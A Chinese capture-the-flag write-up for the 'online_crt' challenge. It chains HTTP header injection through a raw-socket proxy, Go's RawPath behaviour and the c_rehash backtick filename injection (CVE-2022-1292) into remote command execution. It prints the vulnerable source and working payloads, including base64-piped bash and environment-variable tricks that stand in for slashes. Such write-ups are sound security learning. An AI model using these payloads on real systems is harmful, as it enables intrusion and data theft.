1
第NS届全国⼤学⽣知识竞赛 初赛 online_crt
writeup
项⽬分析
解题
c_rehash
利⽤条件
go server
url注⼊http头
go的RawPath特性
构造利⽤链
第⼀步
第⼆步
使⽤baseTQ 编码
使⽤截断环境变量
使⽤现有环境变量
第三步
总结
author:⽩帽酱 
题⽬给了后端源码  ⼀道题利⽤了前不久出现的⼀个鸡肋洞  题⽬还是⽐较有意思的 
项⽬后端是pyhton + go 
pyhton的服务直接暴露给⽤户 
pyhton服务 ⼀共有4个路由 
/getcrt ⽣成⼀个x509证书 
/createlink 调⽤ c_rehash 创建证书链接 
项⽬分析
2
/proxy 通过代理访问go服务 
Python
复制代码
@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template("index.html")
@app.route('/getcrt', methods=['GET', 'POST'])
def upload():
    Country = request.form.get("Country", "CN")
    Province = request.form.get("Province", "a")
    City = request.form.get("City", "a")
    OrganizationalName = request.form.get("OrganizationalName", "a")
    CommonName = request.form.get("CommonName", "a")
    EmailAddress = request.form.get("EmailAddress", "a")
    return get_crt(Country, Province, City, OrganizationalName, 
CommonName, EmailAddress)
@app.route('/createlink', methods=['GET'])
def info():
    json_data = {"info": os.popen("c_rehash static/crt/ && ls 
static/crt/").read()}
    return json.dumps(json_data)
@app.route('/proxy', methods=['GET'])
def proxy():
    uri = request.form.get("uri", "/")
    client = socket.socket()
    client.connect(('localhost', 8887))
    msg = f'''GET {uri} HTTP/1.1
    Host: test_api_host
    User-Agent: Guest
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    '''
    client.send(msg.encode())
    data = client.recv(2048)
    client.close()
    return data.decode()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
3
go后端有⼀个admin路由 
⽤于重命名证书⽂件
题⽬中出现了 c_rehash   
c_rehash是openssl中的⼀个⽤perl编写的脚本⼯具 
⽤于批量创建证书等⽂件 hash命名的符号链接 
最近c_rehash  出了个命令注⼊漏洞 (CVE-2022-1292) 
经过搜索⽹上并没有公开的exp (可能因为这个漏洞⾮常鸡肋) 
只能通过diﬀ进⾏分析 
解题
 c_rehash 
Python
复制代码
func admin(c *gin.Context) {
    staticPath := "/app/static/crt/"
    oldname := c.DefaultQuery("oldname", "")
    newname := c.DefaultQuery("newname", "")
    if oldname == "" || newname == "" || strings.Contains(oldname, "..") 
|| strings.Contains(newname, "..") {
        c.String(500, "error")
        return
    }
    if c.Request.URL.RawPath != "" && c.Request.Host == "admin" {
        err := os.Rename(staticPath+oldname, staticPath+newname)
        if err != nil {
            return
        }
        c.String(200, newname)
        return
    }
    c.String(200, "no"+c.Request.URL.RawPath+","+c.Request.Host )
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
4
https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8 
这个就是漏洞的commit 
很容易看出 ⽂件名这⾥过滤不严 没有过滤反引号就直接把⽂件名拼接到了命令⾥ 
所以只要在⽂件名中使⽤反引号就可以执⾏任意命令
继续上前追溯
5
发现在执⾏命令前会检查 ⽂件后缀名.(pem)|(crt)|(cer)|(crl) 和⽂件内容 
⽂件内容必须包含证书或者是吊销列表才能通过检查
到这⾥可以整理出这个鸡肋洞的条件了
1. 执⾏c_rehash  ⽬标⽬录下⽂件可控 
2. ⽂件后缀符合要求
3. ⽂件内容必须包含证书或者是吊销列表
4. ⽂件名可控
 利⽤条件 
Perl
复制代码
sub hash_dir {
    my %hashlist;
    print "Doing $_[0]\n";
    chdir $_[0];
    opendir(DIR, ".");
    my @flist = sort readdir(DIR);
    closedir DIR;
    if ( $removelinks ) {
        # Delete any existing symbolic links
        foreach (grep {/^[\da-f]+\.r{0,1}\d+$/} @flist) {
            if (-l $_) {
                print "unlink $_" if $verbose;
                unlink $_ || warn "Can't unlink $_, $!\n";
            }
        }
    }
    FILE: foreach $fname (grep {/\.(pem)|(crt)|(cer)|(crl)$/} @flist) {
        # Check to see if certificates and/or CRLs present.
        my ($cert, $crl) = check_file($fname);
        if (!$cert && !$crl) {
            print STDERR "WARNING: $fname does not contain a certificate 
or CRL: skipping\n";
            next;
        }
        link_hash_cert($fname) if ($cert);
        link_hash_crl($fname) if ($crl);
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
6
题⽬中⽣成证书的功能可以创建⼀个满⾜要求的⽂件
接下来看go的部分 
为了实现可控的⽂件名 我们需要调⽤go的重命名功能 
go的路由在重命名前有两个校验 
c.Request.URL.RawPath != "" && c.Request.Host == "admin"  
⾸先需要绕过这两个验证
Request.Host就是请求的host头 
在python的请求包中host头是固定的 (test_api_host) 
这⾥要想办法让go后端认为host值是admin 
python 在代理请求时直接使⽤了socket 发送raw数据包 
在数据包{uri}处没有过滤 
所以我们可以直接在uri注⼊⼀个host头来替换原先的头 
注⼊之后数据包就变成了这样
go server 
url注⼊http头 
7
这样就绕过了host头的校验 
通过阅读go net库的源码 
我发现在go中会对原始url进⾏反转义操作(URL解码)  
如果反转义后再次转义的url与原始url不同 那么RawPath会被设置为原始url 反之置为空 
go的RawPath特性 
Perl
复制代码
GET / HTTP/1.1
Host: admin
User-Agent: Guest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
HTTP/1.1
Host: test_api_host
User-Agent: Guest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
8
注释中贴⼼的给出了示例和详细的功能介绍
所以只要我们把url中的任意⼀个斜杠进⾏url编码 就可以绕过这个检查了 
接下来就是构造这个简单的利⽤链
请求 /getcrt 路由 ⽣成⼀个证书 返回证书路径 
请求 /proxy   修改证书名为恶意⽂件名 
这⾥有⼀些坑点
linux⽂件名虽然可以包⼤部分可打印字符  
构造利⽤链
第⼀步  
第⼆步
9
但是有⼀个除外 那就是斜杠 
不能使⽤斜杠这限制了命令执⾏的内容
下⾯是我在这次ctf尝试的解决⽅案 
在这⼀步我尝试了⼏个⼩时
⽬标环境有些⽞学的问题
构造 `echo Y2F0IC9mbGFnID4gZHNmZ2g= |base64 -d|bash` 
尝试使⽤base64绕过 
本地测试利⽤成功
在⽬标机器多次尝试均失败 (可能是⽬标docker环境问题 缺少base64⼯具) 
linux有很多预制的系统环境变量 
⽐如PATH SHELL 
bash 可以通过${变量名:偏移:⻓度}  简单的截取环境变量值 
这⾥我们使⽤SHELL环境变量的开头第⼀个字符来替代斜杠 
${SHELL:0:1} 
这种⽅法本地测试成功  
都是在⽬标机器多次尝试还是失败
构造命令 `env >qweqwe` 
获取到了⽬标机器的环境变量值
运⽓⾮常好 OLDPWD的值刚好为我们所需要的 /  
最终使⽤了这个⽅法成功读取到了ﬂag 
使⽤base64 编码 
使⽤截断环境变量
使⽤现有环境变量
10
请求 /createlink 触发 c_rehash   RCE 
`ls $OLDPWD  >qweqwe` 
成功列出了根⽬录的内容
然后执⾏ `cat ${OLDPWD}ﬂag >jnyghj` 
读取ﬂag 
uri=/admin/rename?oldname=d205092e-c641-423e-82f0-e96f583f3c38.crt&newname=0`cat 
${OLDPWD}ﬂag >jnyghj`.crt 
第三步
11
因为之前分析过c_rehash这个鸡肋的洞 当时看了⼀眼标题就猜到了整个利⽤链 
没想到还是在构造payload上花了太多时间 
(由于利⽤特殊性 这个漏洞在实战应该不太可能遇⻅) 
总结
不知道尝试了有多少次2333